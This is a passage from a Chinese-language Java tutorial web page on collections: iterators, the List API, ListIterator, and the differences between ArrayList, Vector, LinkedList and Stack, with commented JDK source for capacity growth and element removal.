class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyArrayList</span> <span class="keyword">implements</span> <span class="title">Iterable</span></span>&#123;</span><br><span class="line"><span class="comment">//为什么使用Object，因为只是说这个容器是用来装对象的，但是不知道用来装什么对象。</span></span><br><span class="line"><span class="keyword">private</span> Object[] data;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> total;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其他代码省略....</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Iterator <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> MyItr();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MyItr</span> <span class="keyword">implements</span> <span class="title">Iterator</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cursor;<span class="comment">//游标</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> cursor!=total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> data[cursor++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考：如果遍历数组，什么情况下选用foreach，什么情况下选用for循环？</p><p>当如果你的操作中涉及到[下标]操作时，用for最好。</p><p>当你只是查看元素的内容，那么选foreach更简洁一些。</p><p>思考：如果遍历Collection系列集合，什么情况下选用foreach，是否能选用for循环？</p><p>首先考虑使用foreach，如果该集合也有索引信息的话，也可以通过for来操作，如果没有下标的信息，就不要用for。即，如果该集合的物理结构是数组的，那么可以用for，如果物理结构是链式，那么使用下标操作效率很低。</p><p>思考：如果遍历Collection系列集合，什么情况下选用foreach，什么情况下使用Iterator？</p><p>如果只是查看集合的元素，使用foreach，代码会更简洁。</p><p>但是如果要涉及到在遍历集合的同时根据某种条件要删除元素等操作，那么选用Iterator。</p><h2 id="12-4-List"><a href="#12-4-List" class="headerlink" title="12.4 List"></a>12.4 List</h2><h3 id="12-4-1-List概述"><a href="#12-4-1-List概述" class="headerlink" title="12.4.1 List概述"></a>12.4.1 List概述</h3><p>List：是Collection的子接口。</p><p>List系列的集合：有序的、可重复的</p><p>List系列的常用集合：ArrayList、Vector、LinkedList、Stack</p><h3 id="12-4-2-List的API"><a href="#12-4-2-List的API" class="headerlink" title="12.4.2 List的API"></a>12.4.2 List的API</h3><p>常用方法：</p><p>（1）boolean add(Object obj)：添加一个</p><p>（2）boolean addAll（Collection c）：添加多个</p><p>（3）void add(int index, Object obj)：添加一个，指定位置添加</p><p>（4）void addAll(int index, Collection c）：添加多个</p><p>（5）boolean remove(Object obj)：删除一个</p><p>（6）Object remove(int index)：删除指定位置的元素，并返回刚刚删除的元素</p><p>（7）boolean removeAll(Collection c )： 删除多个</p><p>（8）boolean contains(Object c)：是否包含某个</p><p>（9）boolean containsAll(Collection c)： 是否包含所有</p><p>（10）boolean isEmpty()：是否为空</p><p>（11）int size()：获取元素个数</p><p>（12）void clear()：清空集合</p><p>（13）Object[] toArray()：获取所有元素</p><p>（14）Iterator iterator()： 获取遍历当前集合的迭代器对象</p><p>（15）retainAll(Collection c)：求当前集合与c集合的交集</p><p>（16）ListIterator listIterator()：获取遍历当前集合的迭代器对象，这个迭代器可以往前、往后遍历</p><p>（17）ListIterator listIterator(int index)：从[index]位置开始，往前或往后遍历</p><p>（18）Object get(int index)：返回index位置的元素</p><p>（19）List  subList(int start, int end)：截取[start,end)部分的子列表</p><h3 id="12-4-3-ListIterator-接口"><a href="#12-4-3-ListIterator-接口" class="headerlink" title="12.4.3 ListIterator 接口"></a>12.4.3 ListIterator 接口</h3><p>Iterator 接口的方法：</p><p>（1）boolean hasNext()</p><p>（2）Object next()</p><p>（3）void remove()</p><p>ListIterator 是 Iterator子接口：增加了如下方法</p><p>（4）void add(Object obj)</p><p>（5）void set(Object obj)</p><p>（6）boolean hasPrevious()</p><p>（7）Object previous()</p><p>（8）int nextIndex()</p><p>（9）int previousIndex()</p><h3 id="12-4-4-List的实现类们的区别"><a href="#12-4-4-List的实现类们的区别" class="headerlink" title="12.4.4 List的实现类们的区别"></a>12.4.4 List的实现类们的区别</h3><p>ArrayList、Vector、LinkedList、Stack</p><p>（1）ArrayList、Vector：都是动态数组</p><p>Vector是最早版本的动态数组，线程安全的，默认扩容机制是2倍，支持旧版的迭代器Enumeration</p><p>ArrayList是后增的动态数组，线程不安全的，默认扩容机制是1.5倍</p><p>（2）动态数组与LinkedList的区别</p><p>动态数组：底层物理结构是数组</p><p>​    优点：根据[下标]访问的速度很快</p><p>​    缺点：需要开辟连续的存储空间，而且需要扩容，移动元素等操作</p><p>LinkedList：底层物理结构是双向链表</p><p>​    优点：在增加、删除元素时，不需要移动元素，只需要修改前后元素的引用关系</p><p>​    缺点：我们查找元素时，只能从first或last开始查找</p><p>（3）Stack：栈</p><p>是Vector的子类。比Vector多了几个方法，能够表现出“先进后出或后进先出”的特点。</p><p>①Object peek()：访问栈顶元素</p><p>②Object pop()：弹出栈顶元素</p><p>③push()：把元素压入栈顶</p><p>（4）LinkedList可以作为很多种数据结构使用</p><p>单链表：只关注next就可以</p><p>队列：先进先出，找对应的方法</p><p>双端队列(JDK1.6加入)：两头都可以进出，找对应的方法</p><p>栈：先进后出，找对应的方法</p><p>建议：虽然LinkedList是支持对索引进行操作，因为它实现List接口的所有方法，但是我们不太建议调用类似这样的方法，因为效率比较低。</p><h3 id="12-4-5-源码分析"><a href="#12-4-5-源码分析" class="headerlink" title="12.4.5 源码分析"></a>12.4.5 源码分析</h3><h4 id="（1）Vector"><a href="#（1）Vector" class="headerlink" title="（1）Vector"></a>（1）Vector</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(<span class="number">10</span>);<span class="comment">//指定初始容量initialCapacity为10</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(initialCapacity, <span class="number">0</span>);<span class="comment">//指定capacityIncrement增量为0</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">int</span> capacityIncrement增量为<span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>();</span><br><span class="line">       <span class="comment">//判断了形参初始容量initialCapacity的合法性</span></span><br><span class="line">       <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                              initialCapacity);</span><br><span class="line">       <span class="comment">//创建了一个Object[]类型的数组</span></span><br><span class="line">       <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];<span class="comment">//默认是10</span></span><br><span class="line">       <span class="comment">//增量，默认是0，如果是0，后面就按照2倍增加，如果不是0，后面就按照你指定的增量进行增量</span></span><br><span class="line">       <span class="keyword">this</span>.capacityIncrement = capacityIncrement;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//synchronized意味着线程安全的   </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line">    <span class="comment">//看是否需要扩容</span></span><br><span class="line">        ensureCapacityHelper(elementCount + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//把新的元素存入[elementCount]，存入后，elementCount元素的个数增1</span></span><br><span class="line">        elementData[elementCount++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityHelper</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="comment">//看是否超过了当前数组的容量</span></span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);<span class="comment">//扩容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">int</span> oldCapacity = elementData.length;<span class="comment">//获取目前数组的长度</span></span><br><span class="line">        <span class="comment">//如果capacityIncrement增量是0，新容量 = oldCapacity的2倍</span></span><br><span class="line">        <span class="comment">//如果capacityIncrement增量是不是0，新容量 = oldCapacity + capacityIncrement增量;</span></span><br><span class="line">        <span class="keyword">int</span> newCapacity = oldCapacity + ((capacityIncrement &gt; <span class="number">0</span>) ?</span><br><span class="line">                                         capacityIncrement : oldCapacity);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果按照上面计算的新容量还不够，就按照你指定的需要的最小容量来扩容minCapacity</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果新容量超过了最大数组限制，那么单独处理</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//把旧数组中的数据复制到新数组中，新数组的长度为newCapacity</span></span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> removeElement(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">removeElement</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">//查找obj在当前Vector中的下标</span></span><br><span class="line">    <span class="keyword">int</span> i = indexOf(obj);</span><br><span class="line">    <span class="comment">//如果i&gt;=0，说明存在，删除[i]位置的元素</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        removeElementAt(i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> indexOf(o, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;<span class="comment">//要查找的元素是null值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = index ; i &lt; elementCount ; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)<span class="comment">//如果是null值，用==null判断</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//要查找的元素是非null值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = index ; i &lt; elementCount ; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))<span class="comment">//如果是非null值，用equals判断</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">removeElementAt</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">//判断下标的合法性</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index + <span class="string">" &gt;= "</span> +</span><br><span class="line">                                                 elementCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//j是要移动的元素的个数</span></span><br><span class="line">    <span class="keyword">int</span> j = elementCount - index - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//如果需要移动元素，就调用System.arraycopy进行移动</span></span><br><span class="line">    <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//把index+1位置以及后面的元素往前移动</span></span><br><span class="line">        <span class="comment">//index+1的位置的元素移动到index位置，依次类推</span></span><br><span class="line">        <span class="comment">//一共移动j个</span></span><br><span class="line">        System.arraycopy(elementData, index + <span class="number">1</span>, elementData, index, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//元素的总个数减少</span></span><br><span class="line">    elementCount--;</span><br><span class="line">    <span class="comment">//将elementData[elementCount]这个位置置空，用来添加新元素，位置的元素等着被GC回收</span></span><br><span class="line">    elementData[elementCount] = <span class="keyword">null</span>; <span class="comment">/* to let gc do its work */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="（2）ArrayList源码分析"><a href="#（2）ArrayList源码分析" class="headerlink" title="（2）ArrayList源码分析"></a>（2）ArrayList源码分析</h4><p>JDK1.6：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>(<span class="number">10</span>);<span class="comment">//指定初始容量为10</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line">      <span class="comment">//检查初始容量的合法性</span></span><br><span class="line">      <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                             initialCapacity);</span><br><span class="line">      <span class="comment">//数组初始化为长度为initialCapacity的数组</span></span><br><span class="line"><span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>JDK1.7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;<span class="comment">//默认初始容量10</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>();</span><br><span class="line">       <span class="keyword">this</span>.elementData = EMPTY_ELEMENTDATA;<span class="comment">//数组初始化为一个空数组</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//查看当前数组是否够多存一个元素</span></span><br><span class="line">       ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">       elementData[size++] = e;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (elementData == EMPTY_ELEMENTDATA) &#123;<span class="comment">//如果当前数组还是空数组</span></span><br><span class="line">           <span class="comment">//minCapacity按照 默认初始容量和minCapacity中的的最大值处理</span></span><br><span class="line">           minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">//看是否需要扩容处理</span></span><br><span class="line">       ensureExplicitCapacity(minCapacity);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>JDK1.8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_CAPACITY = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;<span class="comment">//初始化为空数组</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//查看当前数组是否够多存一个元素</span></span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//存入新元素到[size]位置，然后size自增1</span></span><br><span class="line">        elementData[size++] = e;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果当前数组还是空数组</span></span><br><span class="line">        <span class="keyword">if</span> (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">            <span class="comment">//那么minCapacity取DEFAULT_CAPACITY与minCapacity的最大值</span></span><br><span class="line">            minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//查看是否需要扩容</span></span><br><span class="line">        ensureExplicitCapacity(minCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        modCount++;<span class="comment">//修改次数加1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果需要的最小容量  比  当前数组的长度  大，即当前数组不够存，就扩容</span></span><br><span class="line">        <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">            grow(minCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">int</span> oldCapacity = elementData.length;<span class="comment">//当前数组容量</span></span><br><span class="line">        <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);<span class="comment">//新数组容量是旧数组容量的1.5倍</span></span><br><span class="line">        <span class="comment">//看旧数组的1.5倍是否够</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = minCapacity;</span><br><span class="line">        <span class="comment">//看旧数组的1.5倍是否超过最大数组限制</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//复制一个新数组</span></span><br><span class="line">        elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//先找到o在当前ArrayList的数组中的下标</span></span><br><span class="line">    <span class="comment">//分o是否为空两种情况讨论</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[index] == <span class="keyword">null</span>) &#123;<span class="comment">//null值用==比较</span></span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[index])) &#123;<span class="comment">//非null值用equals比较</span></span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    modCount++;<span class="comment">//修改次数加1</span></span><br><span class="line">    <span class="comment">//需要移动的元素个数</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果需要移动元素，就用System.arraycopy移动元素</span></span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将elementData[size-1]位置置空，让GC回收空间，元素个数减少</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 